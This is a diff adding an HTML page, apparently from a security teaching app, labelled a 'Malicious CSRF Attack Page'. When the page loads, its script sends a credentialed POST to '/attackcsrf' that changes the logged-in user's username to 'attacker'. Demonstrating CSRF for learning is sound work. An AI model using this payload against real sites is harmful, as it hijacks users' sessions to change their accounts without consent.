@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Security App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="color-scheme" content="light dark">
+    <meta name="theme-color" content="#4f46e5">
+  
+</head>
+<body class="min-h-screen bg-gray-50 text-gray-800" onload="attack()">
+    <header class="sticky top-0 z-40 w-full shadow-sm bg-blue-500 text-white">
+        <div class="max-w-6xl mx-auto">
+            <nav class="px-4 sm:px-6">
+                <div class="flex items-center justify-between py-4">
+                    <a href="/" class="select-none no-underline">
+                        <span class="block font-extrabold tracking-wide text-white text-2xl sm:text-3xl">
+                            Security App
+                        </span>
+                    </a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    
+    <main class="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 pt-6 md:pt-10 pb-4 md:pb-6">
+    <div class="max-w-xl mx-auto">
+        <div class="bg-white shadow-sm border border-gray-200 rounded-xl overflow-hidden">
+            <div class="px-6 py-5 bg-gradient-to-r from-indigo-50 to-white">
+                <h2 class="text-xl sm:text-2xl font-semibold text-gray-900">Cross Site Request Forgery</h2>
+                <p class="text-sm text-gray-500 mt-1">Fill in the details below to login</p>
+            </div>
+            <div class="px-6 py-6">
+                <div class="space-y-5">
+                    <div>
+                        <h3 class="text-lg font-medium text-gray-900">Malicious CSRF Attack Page</h3>
+                        <p class="text-sm text-gray-500 mt-1">This page attempts to perform a CSRF attack on the vulnerable login form.</p>
+                    </div>
+                    <div id="result" class="box" style="display:none">
+                        <p><strong>Old username:</strong> <span id="oldusername"></span></p>
+                        <p><strong>New username:</strong> <span id="newusername"></span></p>
+                        <p><strong>Message:</strong> <span id="message"></span></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    </main>
+
+    
+    <footer class="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 text-center text-sm text-gray-500">
+        <span>&copy; <span id="year"></span> Security App</span>
+    </footer>
+
+    <script>
+        document.getElementById('year').textContent = new Date().getFullYear();
+    </script>
+</body>
+<script>
+    async function attack() {
+        try {
+          const res = await fetch('/attackcsrf', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',            
+          body: JSON.stringify({ newusername: 'attacker' })
+        });
+        const text = await res.text();
+        let data;
+        try {
+          data = JSON.parse(text);
+        } catch {
+          data = { msg: text };
+        }
+        document.getElementById('oldusername').textContent = data.oldusername || 'N/A';
+        document.getElementById('newusername').textContent = data.newusername || 'N/A';
+        document.getElementById('message').textContent = data.message || 'N/A';
+        document.getElementById('result').style.display = 'block';
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    }
+</script>
+</html>
